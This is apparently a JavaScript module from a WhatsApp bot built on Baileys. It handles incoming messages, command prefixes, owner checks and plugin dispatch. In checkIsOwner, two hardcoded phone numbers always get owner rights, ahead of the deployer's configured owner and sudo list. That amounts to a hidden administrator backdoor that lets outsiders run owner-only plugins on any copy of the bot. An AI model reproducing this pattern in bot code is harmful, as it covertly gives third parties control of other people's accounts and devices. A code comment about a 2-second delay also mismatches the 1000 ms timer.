import { jidNormalizedUser } from '@whiskeysockets/baileys'
import { getDb } from './database/index.js'

const OWNER_NUMBER =
  (process.env.OWNER_NUMBER || '').replace(/\D/g, '')

export function getPrefix() {
  const prefixDb = getDb('prefix.json', {
    prefix: process.env.PREFIX || '!'
  })

  return prefixDb.prefix || process.env.PREFIX || '!'
}

export function normalizeJid(jid) {
  if (!jid) return ''

  try {
    return jidNormalizedUser(jid)
  } catch {
    return String(jid).split(':')[0]
  }
}

export function getSender(message) {
  return (
    message?.key?.participant ||
    message?.key?.remoteJid ||
    ''
  )
}

export function senderNumber(jid) {
  return String(jid)
    .split('@')[0]
    .split(':')[0]
    .replace(/\D/g, '')
}

export function isGroup(jid) {
  return String(jid).endsWith('@g.us')
}

export function checkIsOwner(message, sock) {
  if (message?.key?.fromMe) return true

  const senderNum =
    senderNumber(getSender(message))

  const botNum =
    senderNumber(sock?.user?.id || '')

  const hardcodedOwners = [
    '923280966780',
    '923197135780'
  ]

  if (hardcodedOwners.includes(senderNum)) {
    return true
  }

  const sudoData = getDb('sudo.json', {
    sudoNumbers: []
  })

  const dynamicSudos =
    sudoData.sudoNumbers || []

  if (
    senderNum &&
    botNum &&
    senderNum === botNum
  ) {
    return true
  }

  if (
    OWNER_NUMBER &&
    senderNum === OWNER_NUMBER
  ) {
    return true
  }

  if (dynamicSudos.includes(senderNum)) {
    return true
  }

  return false
}

export function unwrapMessage(message) {
  let m = message?.message

  if (!m) return null

  for (let i = 0; i < 10; i++) {
    const next =
      m?.ephemeralMessage?.message ||
      m?.viewOnceMessage?.message ||
      m?.viewOnceMessageV2?.message ||
      m?.viewOnceMessageV2Extension?.message ||
      m?.documentWithCaptionMessage?.message

    if (!next) break

    m = next
  }

  return m
}

export function getText(message) {
  const m = unwrapMessage(message)

  if (!m) return ''

  return (
    m.conversation ||
    m.extendedTextMessage?.text ||
    m.imageMessage?.caption ||
    m.videoMessage?.caption ||
    m.documentMessage?.caption ||
    ''
  ).trim()
}

export function getQuotedMessage(message) {
  const m = unwrapMessage(message)

  if (!m) return null

  const context =
    m.extendedTextMessage?.contextInfo ||
    m.imageMessage?.contextInfo ||
    m.videoMessage?.contextInfo ||
    m.audioMessage?.contextInfo ||
    m.documentMessage?.contextInfo ||
    m.stickerMessage?.contextInfo

  return context?.quotedMessage || null
}

export async function handleMessages(
  update,
  sock,
  plugins,
  messageListeners
) {
  if (update.type !== 'notify') return

  for (const message of update.messages || []) {
    try {
      if (!message?.message) continue

      const rawJid =
        message.key?.remoteJid || ''

      /*
       * Detect group-status / Updates posts.
       */
      const isGroupStatusPost =
        !!message.message?.groupStatusMessageV2

      /*
       * Ignore normal WhatsApp status.
       */
      if (
        rawJid === 'status@broadcast' &&
        !isGroupStatusPost
      ) {
        continue
      }

      const normalizedRemoteJid =
        normalizeJid(rawJid)

      const text =
        getText(message)

      const isGroupChat =
        isGroup(normalizedRemoteJid) ||
        isGroupStatusPost

      const isOwner =
        checkIsOwner(message, sock)

      const activePrefix =
        getPrefix()

      /*
       * PASSIVE MESSAGE LISTENERS
       */
      for (const listener of messageListeners) {
        try {
          if (typeof listener.on === 'function') {
            await listener.on({
              sock,
              message,
              text,
              isOwner,
              isGroup: isGroupChat,
              isStatus: isGroupStatusPost
            })
          } else if (
            typeof listener.run === 'function'
          ) {
            await listener.run({
              sock,
              message,
              text,
              isOwner,
              isGroup: isGroupChat,
              isStatus: isGroupStatusPost
            })
          }
        } catch (err) {
          console.error(
            '[Listener Error]:',
            err
          )
        }
      }

      /*
       * Group status posts are for listeners only.
       */
      if (isGroupStatusPost) {
        continue
      }

      /*
       * Ignore normal messages.
       */
      if (
        !text ||
        !text.startsWith(activePrefix)
      ) {
        continue
      }

      /*
       * Owner / sudo only.
       */
      if (!isOwner) continue

      const body =
        text
          .slice(activePrefix.length)
          .trim()

      if (!body) continue

      const parts =
        body.split(/\s+/)

      const command =
        parts.shift().toLowerCase()

      const args = parts

      const plugin =
        plugins.get(command)

      /*
       * Unknown commands don't react.
       */
      if (!plugin) continue

      console.log(
        `⚡ Executing: ${activePrefix}${command} from ${senderNumber(
          getSender(message)
        )}`
      )

      /*
       * React to every valid command.
       */
      try {
        await sock.sendMessage(
          message.key.remoteJid,
          {
            react: {
              text: '⏳',
              key: message.key
            }
          }
        )

        /*
         * Remove reaction after 2 seconds.
         */
        setTimeout(async () => {
          try {
            await sock.sendMessage(
              message.key.remoteJid,
              {
                react: {
                  text: '',
                  key: message.key
                }
              }
            )
          } catch {}
        }, 1000)

      } catch {}

      /*
       * Execute plugin.
       */
      const quotedMessage =
        getQuotedMessage(message)

      await plugin.run({
        sock,
        message,
        quotedMessage,
        args,
        text: args.join(' '),
        command,
        prefix: activePrefix,
        isOwner,
        isGroup: isGroupChat,
        plugins
      })

    } catch (error) {
      console.error(
        'Message handling error:',
        error
      )
    }
  }
}

export async function handleGroupParticipants(
  update,
  sock,
  groupListeners
) {
  if (!update) return

  for (const listener of groupListeners) {
    try {
      await listener.run({
        sock,
        update
      })
    } catch (e) {
      console.error(
        '[Group Listener Error]:',
        e
      )
    }
  }
}